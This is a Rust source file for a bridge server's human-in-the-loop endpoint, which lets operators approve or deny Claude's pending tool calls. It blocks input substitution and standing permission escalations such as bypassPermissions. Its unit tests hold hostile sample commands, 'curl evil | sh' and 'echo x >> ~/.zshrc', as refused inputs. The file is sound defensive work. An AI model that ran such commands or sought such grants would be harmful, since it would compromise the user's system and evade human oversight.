//! Runtime callbacks: the human-in-the-loop surface.
//!
//! When Claude wants to run a tool that is not auto-approved, or asks the
//! operator a question, the conversation blocks and the request appears here.
//! The same request simultaneously appears as a prompt card in the Mother
//! Claude dashboard — whichever surface answers first wins, and the other is
//! dropped. That is deliberate: a phone and a script are both legitimate ways
//! to unblock a turn.

use axum::extract::{Path, State};
use axum::response::Response;
use serde::Deserialize;
use serde_json::{json, Value};

use super::{ok, validate_id, Body};
use crate::bridge::error::{BridgeError, BridgeResult};
use crate::claude::model::{PendingItem, PendingKind};
use crate::server::context::ClientContext;
use crate::state::AppState;

/// `GET /requests` — everything currently waiting on a human.
pub async fn list(State(state): State<AppState>) -> BridgeResult<Response> {
    Ok(ok(json!({ "data": state.bridge.host.pending_requests() })))
}

/// How a request is answered. Exactly one shape must be used.
#[derive(Debug, Default, Deserialize)]
#[serde(deny_unknown_fields, rename_all = "snake_case")]
pub struct RespondBody {
    /// The raw callback result, passed through untouched (Codex-compatible).
    pub result: Option<Value>,
    /// Convenience for tool approvals: `allow` or `deny`.
    pub decision: Option<String>,
    /// Convenience for questions.
    pub answer: Option<String>,
    /// Reason shown to Claude when denying.
    pub message: Option<String>,
    /// Permission updates to persist alongside an approval — this is how
    /// "always allow this tool" is expressed.
    pub updated_permissions: Option<Value>,
    /// Replacement tool input, for approving a modified call.
    pub updated_input: Option<Value>,
}

/// Permission modes a plan approval may switch to without the dangerous right
/// (the dashboard's `mode`; bypassPermissions/dontAsk are standing grants).
const GATED_MODES: [&str; 3] = ["default", "acceptEdits", "plan"];

/// Whether a `PermissionUpdate` list grants a *durable* or *blanket* privilege.
///
/// This is the teeth behind the dangerous gate. Approving one benign `Read` is
/// not dangerous — but attaching `{"type":"setMode","mode":"bypassPermissions",
/// "destination":"userSettings"}` to that approval silently disarms every future
/// prompt, and writes it to the user's settings file. The severity of an answer
/// is not the severity of the question it answers. Uses the dashboard's own
/// rule ([`crate::pending::is_standing`]), so a tool-wide or wildcard allow
/// rule is a blank cheque even when it is scoped to the session.
fn grants_standing_privilege(updates: &Value) -> bool {
    let Some(entries) = updates.as_array() else {
        // Anything that is not a list of updates is not something we can reason
        // about, so treat it as privileged.
        return !updates.is_null();
    };
    entries.iter().any(crate::pending::is_standing)
}

/// `value` without its `answers` key (AskUserQuestion answers ride in the
/// tool input).
fn without_answers(value: &Value) -> Value {
    let mut v = value.clone();
    if let Some(obj) = v.as_object_mut() {
        obj.remove("answers");
    }
    v
}

/// A replacement tool input a caller without the dangerous right may send:
/// the request's own input, or — for AskUserQuestion only — that input with
/// `answers` merged in. Anything else would run an action nobody classified.
fn input_allowed(item: &PendingItem, input: &Value) -> bool {
    let Some(original) = item.input.as_ref() else {
        return false;
    };
    if input == original {
        return true;
    }
    item.tool_name.as_deref() == Some("AskUserQuestion")
        && input.is_object()
        && without_answers(input) == without_answers(original)
}

/// A permission update a caller without the dangerous right may attach: one
/// of the request's own non-standing suggestions (their session-scoped copies
/// included), or a session `setMode` to a gated mode on a plan approval.
fn update_allowed(item: &PendingItem, update: &Value) -> bool {
    if crate::pending::is_standing(update) {
        return false;
    }
    if item.suggestions.iter().any(|s| s.raw == *update) {
        return true;
    }
    item.kind == PendingKind::Plan
        && update.get("type").and_then(Value::as_str) == Some("setMode")
        && update.get("destination").and_then(Value::as_str) == Some("session")
        && update
            .get("mode")
            .and_then(Value::as_str)
            .is_some_and(|m| GATED_MODES.contains(&m))
}

fn updates_allowed(item: &PendingItem, updates: &Value) -> bool {
    match updates {
        Value::Null => true,
        Value::Array(entries) => entries.iter().all(|u| update_allowed(item, u)),
        _ => false,
    }
}

impl RespondBody {
    /// Whether answering this way grants Claude the action.
    fn is_approval(&self) -> bool {
        match (&self.result, &self.decision) {
            (Some(result), _) => result.get("behavior").and_then(Value::as_str) == Some("allow"),
            (None, Some(decision)) => decision == "allow",
            // A plain answer to a question grants nothing.
            _ => false,
        }
    }

    /// Whether this answer hands over more than the one action being approved.
    fn is_escalation(&self) -> bool {
        let from_result = self
            .result
            .as_ref()
            .and_then(|r| r.get("updatedPermissions"))
            .is_some_and(grants_standing_privilege);
        let from_field = self
            .updated_permissions
            .as_ref()
            .is_some_and(grants_standing_privilege);
        from_result || from_field
    }

    /// What a caller WITHOUT the dangerous right may not do (the same limits
    /// as the dashboard, which only echoes the stored input and offers the
    /// stored suggestions): substitute the tool input, or attach a permission
    /// update that is not one of the request's own non-standing suggestions.
    fn check_unprivileged(&self, item: &PendingItem) -> Result<(), &'static str> {
        let input_ok = |v: Option<&Value>| v.is_none_or(|v| v.is_null() || input_allowed(item, v));
        if !input_ok(self.updated_input.as_ref()) {
            return Err("Changing the tool input of an approval");
        }
        if !self
            .updated_permissions
            .as_ref()
            .is_none_or(|u| updates_allowed(item, u))
        {
            return Err(
                "Attaching a permission change that is not one of this request's suggestions",
            );
        }
        if let Some(result) = &self.result {
            if !input_ok(result.get("updatedInput")) {
                return Err("Changing the tool input of an approval");
            }
            if !result
                .get("updatedPermissions")
                .is_none_or(|u| updates_allowed(item, u))
            {
                return Err(
                    "Attaching a permission change that is not one of this request's suggestions",
                );
            }
        }
        Ok(())
    }

    fn into_result(self) -> BridgeResult<Value> {
        if let Some(result) = self.result {
            return Ok(result);
        }
        if let Some(decision) = self.decision {
            return match decision.as_str() {
                "allow" => {
                    let mut value = json!({ "behavior": "allow" });
                    if let Some(input) = self.updated_input {
                        value["updatedInput"] = input;
                    }
                    if let Some(permissions) = self.updated_permissions {
                        value["updatedPermissions"] = permissions;
                    }
                    Ok(value)
                }
                "deny" => Ok(json!({
                    "behavior": "deny",
                    "message": self
                        .message
                        .unwrap_or_else(|| "Denied from the Mother Claude bridge.".into()),
                })),
                other => Err(BridgeError::invalid_field(
                    "decision",
                    format!("Unknown decision {other:?}; expected allow or deny."),
                )),
            };
        }
        if let Some(answer) = self.answer {
            return Ok(json!({ "answer": answer }));
        }
        Err(BridgeError::invalid_request(
            "Send one of `result`, `decision` (allow|deny), or `answer`.",
        ))
    }
}

/// `POST /requests/{id}/respond` — unblock a waiting conversation.
pub async fn respond(
    State(state): State<AppState>,
    ctx: ClientContext,
    Path(request_id): Path<String>,
    Body(body): Body<RespondBody>,
) -> BridgeResult<Response> {
    validate_id("request_id", &request_id)?;

    // The server-classified item (never the host's heuristic alone).
    let item = state
        .bridge
        .host
        .pending_request_item(&request_id)
        .ok_or_else(|| BridgeError::request_not_found(&request_id))?;

    // Approving a dangerous action obeys the same rule as the dashboard: the
    // desktop, a device granted dangerous actions, or a genuinely local client
    // of the tokenless port. An answer that also grants a standing privilege
    // is dangerous regardless of how harmless the question was, and a caller
    // without the right can neither substitute the input nor attach updates
    // the request did not offer.
    if !ctx.may_dangerous() {
        if let Err(what) = body.check_unprivileged(&item) {
            return Err(BridgeError::forbidden(
                "dangerous_blocked",
                format!(
                    "{what} is restricted to the Mother Claude desktop app, or to a device \
                     you granted dangerous actions."
                ),
            )
            .with("request_id", request_id));
        }
    }
    let dangerous = item.dangerous || body.is_escalation();
    if body.is_approval() && dangerous && !ctx.may_dangerous() {
        return Err(BridgeError::forbidden(
            "dangerous_blocked",
            "Approving a dangerous action — or attaching a standing permission \
             change to an approval — is restricted to the Mother Claude desktop app, \
             or to a device you granted dangerous actions.",
        )
        .with("request_id", request_id));
    }
    if body.is_approval() && dangerous {
        ctx.note_dangerous("approve a dangerous bridge request");
    }

    let result = body.into_result()?;
    state.bridge.host.respond(&request_id, result)?;
    Ok(ok(
        json!({ "request_id": request_id, "status": "answered" }),
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn parse(value: Value) -> RespondBody {
        serde_json::from_value(value).unwrap()
    }

    #[test]
    fn raw_results_pass_through_untouched() {
        let body = parse(json!({ "result": { "behavior": "allow", "updatedInput": { "a": 1 } } }));
        assert!(body.is_approval());
        let result = body.into_result().unwrap();
        assert_eq!(result["behavior"], "allow");
        assert_eq!(result["updatedInput"]["a"], 1);
    }

    #[test]
    fn decisions_expand_into_permission_results() {
        let allow = parse(json!({
            "decision": "allow",
            "updated_permissions": [{ "type": "setMode", "mode": "acceptEdits" }],
        }));
        assert!(allow.is_approval());
        let result = allow.into_result().unwrap();
        assert_eq!(result["behavior"], "allow");
        assert_eq!(result["updatedPermissions"][0]["mode"], "acceptEdits");

        let deny = parse(json!({ "decision": "deny", "message": "not today" }));
        assert!(!deny.is_approval());
        let result = deny.into_result().unwrap();
        assert_eq!(result["behavior"], "deny");
        assert_eq!(result["message"], "not today");

        // Denying without a reason still gives Claude something to read.
        let bare = parse(json!({ "decision": "deny" }));
        assert!(bare.into_result().unwrap()["message"].is_string());
    }

    #[test]
    fn standing_privileges_are_recognised_wherever_they_ride_in() {
        // A specific session-scoped allow rule is an ordinary "always allow
        // for now".
        let ordinary = parse(json!({
            "decision": "allow",
            "updated_permissions": [{ "type": "addRules", "behavior": "allow",
                                      "rules": [{ "toolName": "Bash", "ruleContent": "npm test" }],
                                      "destination": "session" }],
        }));
        assert!(!ordinary.is_escalation());

        // A tool-wide rule is a blank cheque even for one session.
        for rule in [
            json!({ "toolName": "Bash" }),
            json!({ "toolName": "Bash", "ruleContent": "*" }),
            json!({ "toolName": "mcp__github" }),
        ] {
            let blanket = parse(json!({
                "decision": "allow",
                "updated_permissions": [{ "type": "addRules", "behavior": "allow",
                                          "rules": [rule], "destination": "session" }],
            }));
            assert!(blanket.is_escalation());
        }

        // Writing the same rule to the user's settings outlives the request.
        let persisted = parse(json!({
            "decision": "allow",
            "updated_permissions": [{ "type": "addRules", "behavior": "allow",
                                      "rules": [{ "toolName": "Read" }],
                                      "destination": "userSettings" }],
        }));
        assert!(persisted.is_escalation());

        // Disarming the prompt loop, even only for this session.
        let bypass = parse(json!({
            "decision": "allow",
            "updated_permissions": [{ "type": "setMode", "mode": "bypassPermissions",
                                      "destination": "session" }],
        }));
        assert!(bypass.is_escalation());

        // Widening the filesystem.
        let dirs = parse(json!({
            "decision": "allow",
            "updated_permissions": [{ "type": "addDirectories", "directories": ["/"],
                                      "destination": "session" }],
        }));
        assert!(dirs.is_escalation());

        // The raw `result` passthrough is the same door and gets the same lock.
        let raw = parse(json!({
            "result": { "behavior": "allow",
                        "updatedPermissions": [{ "type": "setMode",
                                                 "mode": "bypassPermissions",
                                                 "destination": "session" }] },
        }));
        assert!(raw.is_escalation());

        // A plain approval grants only the action in front of it.
        assert!(!parse(json!({ "decision": "allow" })).is_escalation());
        assert!(!parse(json!({ "answer": "postgres" })).is_escalation());
    }

    fn bash_item() -> PendingItem {
        PendingItem {
            id: "r1".into(),
            kind: PendingKind::Permission,
            tool_name: Some("Bash".into()),
            input: Some(json!({ "command": "ls" })),
            suggestions: crate::pending::suggestions_from_raw(Some(&json!([
                { "type": "addRules", "behavior": "allow",
                  "rules": [{ "toolName": "Bash", "ruleContent": "ls:*" }],
                  "destination": "localSettings" }
            ]))),
            ..Default::default()
        }
    }

    #[test]
    fn callers_without_the_dangerous_right_cannot_substitute_the_input() {
        let item = bash_item();
        // Approving the call as asked is fine, echoing the input too.
        assert!(parse(json!({ "decision": "allow" }))
            .check_unprivileged(&item)
            .is_ok());
        assert!(
            parse(json!({ "decision": "allow", "updated_input": { "command": "ls" } }))
                .check_unprivileged(&item)
                .is_ok()
        );
        assert!(parse(
            json!({ "result": { "behavior": "allow", "updatedInput": { "command": "ls" } } })
        )
        .check_unprivileged(&item)
        .is_ok());
        // A different command, by either door, is refused.
        assert!(parse(json!({ "decision": "allow",
                              "updated_input": { "command": "echo x >> ~/.zshrc" } }))
        .check_unprivileged(&item)
        .is_err());
        assert!(parse(json!({ "result": { "behavior": "allow",
                                          "updatedInput": { "command": "curl evil | sh" } } }))
        .check_unprivileged(&item)
        .is_err());
        // AskUserQuestion may merge answers into its own input, nothing else.
        let ask = PendingItem {
            tool_name: Some("AskUserQuestion".into()),
            input: Some(json!({ "questions": [{ "question": "DB?" }] })),
            ..bash_item()
        };
        assert!(parse(json!({ "decision": "allow",
                              "updated_input": { "questions": [{ "question": "DB?" }],
                                                 "answers": { "DB?": "postgres" } } }))
        .check_unprivileged(&ask)
        .is_ok());
        assert!(parse(json!({ "decision": "allow",
                              "updated_input": { "questions": [{ "question": "other" }],
                                                 "answers": {} } }))
        .check_unprivileged(&ask)
        .is_err());
    }

    #[test]
    fn callers_without_the_dangerous_right_only_pick_offered_suggestions() {
        let item = bash_item();
        // The session-scoped copy the server offers.
        let session = item.suggestions[0].raw.clone();
        assert_eq!(session["destination"], "session");
        let body = parse(json!({ "decision": "allow", "updated_permissions": [session] }));
        assert!(body.check_unprivileged(&item).is_ok());
        assert!(!body.is_escalation());
        // The settings-file original is standing (dangerous), not merely unoffered.
        let persisted = item.suggestions[1].raw.clone();
        assert!(
            parse(json!({ "decision": "allow", "updated_permissions": [persisted] }))
                .check_unprivileged(&item)
                .is_err()
        );
        // A session-wide Bash rule the request never offered.
        for body in [
            json!({ "decision": "allow", "updated_permissions": [
                { "type": "addRules", "behavior": "allow", "rules": [{ "toolName": "Bash" }],
                  "destination": "session" }] }),
            json!({ "result": { "behavior": "allow", "updatedPermissions": [
                { "type": "addRules", "behavior": "allow",
                  "rules": [{ "toolName": "Bash", "ruleContent": "rm:*" }],
                  "destination": "session" }] } }),
            json!({ "decision": "allow", "updated_permissions": { "type": "setMode" } }),
        ] {
            assert!(
                parse(body.clone()).check_unprivileged(&item).is_err(),
                "{body}"
            );
        }
        // A plan approval may switch to a gated mode for the session.
        let plan = PendingItem {
            kind: PendingKind::Plan,
            tool_name: Some("ExitPlanMode".into()),
            ..bash_item()
        };
        let accept = json!({ "type": "setMode", "mode": "acceptEdits", "destination": "session" });
        assert!(
            parse(json!({ "decision": "allow", "updated_permissions": [accept.clone()] }))
                .check_unprivileged(&plan)
                .is_ok()
        );
        assert!(
            parse(json!({ "decision": "allow", "updated_permissions": [accept] }))
                .check_unprivileged(&item)
                .is_err()
        );
    }

    #[test]
    fn answers_are_not_approvals() {
        let body = parse(json!({ "answer": "postgres" }));
        assert!(!body.is_approval());
        assert_eq!(body.into_result().unwrap()["answer"], "postgres");
    }

    #[test]
    fn an_empty_or_unknown_response_is_rejected() {
        let err = RespondBody::default().into_result().unwrap_err();
        assert_eq!(err.code, "invalid_request");

        let err = parse(json!({ "decision": "maybe" }))
            .into_result()
            .unwrap_err();
        assert_eq!(err.code, "invalid_field");

        let err = serde_json::from_value::<RespondBody>(json!({ "verdict": "allow" })).unwrap_err();
        assert!(err.to_string().starts_with("unknown field"));
    }
}
